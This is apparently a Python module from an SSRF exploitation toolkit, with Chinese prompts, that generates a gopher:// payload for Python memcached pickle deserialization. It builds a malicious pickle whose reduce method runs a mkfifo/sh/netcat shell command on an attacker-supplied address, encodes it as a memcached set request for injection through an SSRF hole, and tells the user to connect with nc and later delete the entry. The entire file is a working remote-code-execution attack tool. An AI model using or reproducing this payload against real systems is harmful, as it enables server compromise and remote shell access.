import pickle as cPickle
import os
import urllib
import urllib.parse
from .colors import c, DIM, BOLD, CYAN, YELLOW, GREEN, RED, UNDERLINE, BRIGHT_CYAN, BRIGHT_GREEN, BRIGHT_YELLOW, print_banner, print_step, print_info, print_success, print_warning


def PyMemcached():
    print_banner("Python Memcached 反序列化利用")

    print_step(1, "配置监听地址")
    print_info("攻击机将监听此地址，等待目标服务器反弹连接")
    print_warning("请确保攻击机可接受外部连接")
    server = input(c("  > 监听 IP 地址 (默认 127.0.0.1): ", CYAN))
    if not server:
        server = "127.0.0.1"
        print_info(f"使用默认值: {server}")

    cmd = f"rm -f /tmp/f; mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc -l {server} 1234 > /tmp/f"

    class PickleRCE(object):
        def __reduce__(self):
            if cmd:
                return (os.system, (cmd,))

    command = cPickle.dumps(PickleRCE())

    def get_payload(command):
        payload = (
            urllib.parse.quote_plus(command)
            .replace("+", "%20")
            .replace("%2F", "/")
            .replace("%25", "%")
            .replace("%3A", ":")
        )
        finalpayload = f"%0d%0aset%20SpyD3r%201%2060%20{len(command)}%0d%0a{payload}%0d%0a"
        return finalpayload

    print_banner("利用链接已生成")
    print("")
    print(c("  将以下 URL 编码到 SSRF 漏洞中:", CYAN))
    print("")
    print(c("  " + "-" * 48, DIM))
    print(c(f"gopher://127.0.0.1:11211/_{get_payload(command)}", UNDERLINE + YELLOW))
    print(c("  " + "-" * 48, DIM))
    print("")
    print_step("连接", "反弹 Shell")
    print_warning("在发送请求前，请先在攻击机上运行以下命令:")
    print("")
    print(c(f"    nc {server} 1234", BOLD + GREEN))
    print("")
    print_info(f"反弹连接地址: {server}:1234")
    print("")
    print(c("  完成后可使用以下 payload 删除 memcached 项目:", CYAN))
    print(c("gopher://127.0.0.1:11211/_%0d%0adelete%20SpyD3r%0d%0a", UNDERLINE + YELLOW))

    print("\n" + c("  " + "=" * 48, BRIGHT_CYAN))
    print(c("  原作者: $_SpyD3r_$", BRIGHT_CYAN))
    print(c("  修改者: @_mingy_@", BRIGHT_CYAN))
    print(c("  " + "=" * 48, BRIGHT_CYAN))
